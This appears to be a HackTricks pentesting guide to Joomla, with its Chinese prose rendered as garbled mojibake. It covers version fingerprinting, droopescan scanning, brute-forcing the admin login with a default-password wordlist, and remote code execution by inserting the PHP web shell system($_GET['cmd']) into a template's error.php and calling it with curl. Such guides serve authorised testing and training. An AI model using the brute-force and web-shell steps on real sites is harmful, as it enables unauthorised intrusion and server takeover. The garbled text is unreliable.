# Joomla

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* å¦‚æœæ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œï¼Œæƒ³åœ¨**HackTricks**ä¸Šçœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…æƒ³è¦è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½HackTricksçš„PDF**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—ï¼Œ[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

### Joomla ç»Ÿè®¡æ•°æ®

Joomla æ”¶é›†ä¸€äº›åŒ¿åçš„[ä½¿ç”¨ç»Ÿè®¡æ•°æ®](https://developer.joomla.org/about/stats.html)ï¼Œä¾‹å¦‚ Joomlaã€PHP å’Œæ•°æ®åº“ç‰ˆæœ¬çš„åˆ†å¸ƒæƒ…å†µä»¥åŠåœ¨ Joomla å®‰è£…ä¸Šä½¿ç”¨çš„æœåŠ¡å™¨æ“ä½œç³»ç»Ÿã€‚è¿™äº›æ•°æ®å¯ä»¥é€šè¿‡ä»–ä»¬çš„å…¬å…±[API](https://developer.joomla.org/about/stats/api.html)æŸ¥è¯¢ã€‚
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## æšä¸¾

### å‘ç°/è¶³è¿¹è·Ÿè¸ª

* æ£€æŸ¥ **meta**
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### ç‰ˆæœ¬

* åœ¨ **/administrator/manifests/files/joomla.xml** _**** ä¸­å¯ä»¥æŸ¥çœ‹ç‰ˆæœ¬ã€‚_
* åœ¨ **/language/en-GB/en-GB.xml** ä¸­å¯ä»¥è·å–Joomlaçš„ç‰ˆæœ¬ã€‚
* åœ¨ **plugins/system/cache/cache.xml** ä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¤§è‡´çš„ç‰ˆæœ¬ã€‚

### è‡ªåŠ¨
```bash
droopescan scan joomla --url http://joomla-site.local/
```
```markdown
åœ¨[**80,443 - Pentesting Web Methodology æ˜¯å…³äº CMS æ‰«æå™¨çš„éƒ¨åˆ†**](./#cms-scanners)ï¼Œå¯ä»¥æ‰«æ Joomlaã€‚

### æš´åŠ›ç ´è§£

æ‚¨å¯ä»¥ä½¿ç”¨è¿™ä¸ª[è„šæœ¬](https://github.com/ajnik/joomla-bruteforce)æ¥å°è¯•æš´åŠ›ç ´è§£ç™»å½•ã€‚
```
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

å¦‚æœæ‚¨æˆåŠŸè·å–äº†**ç®¡ç†å‘˜å‡­è¯**ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ·»åŠ **PHPä»£ç **ç‰‡æ®µæ¥åœ¨å…¶ä¸­å®ç°**RCE**ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡**è‡ªå®šä¹‰**ä¸€ä¸ª**æ¨¡æ¿**æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚

1. åœ¨`Configuration`ä¸‹æ–¹å·¦ä¾§ç‚¹å‡»**`Templates`**ï¼Œä»¥æ‰“å¼€æ¨¡æ¿èœå•ã€‚
2. ç‚¹å‡»ä¸€ä¸ª**æ¨¡æ¿**åç§°ã€‚æˆ‘ä»¬é€‰æ‹©`Template`åˆ—ä¸‹çš„**`protostar`**ã€‚è¿™å°†å¸¦æˆ‘ä»¬è¿›å…¥**`Templates: Customise`**é¡µé¢ã€‚
3. æœ€åï¼Œæ‚¨å¯ä»¥ç‚¹å‡»ä¸€ä¸ªé¡µé¢ä»¥æ‹‰å–**é¡µé¢æºä»£ç **ã€‚æˆ‘ä»¬é€‰æ‹©**`error.php`**é¡µé¢ã€‚æˆ‘ä»¬å°†æ·»åŠ ä¸€ä¸ª**PHPå•è¡Œä»£ç ä»¥è·å¾—ä»£ç æ‰§è¡Œ**ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
1. **`system($_GET['cmd']);`**
4. **ä¿å­˜ & å…³é—­**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨**HackTricks**ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—ã€‚
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
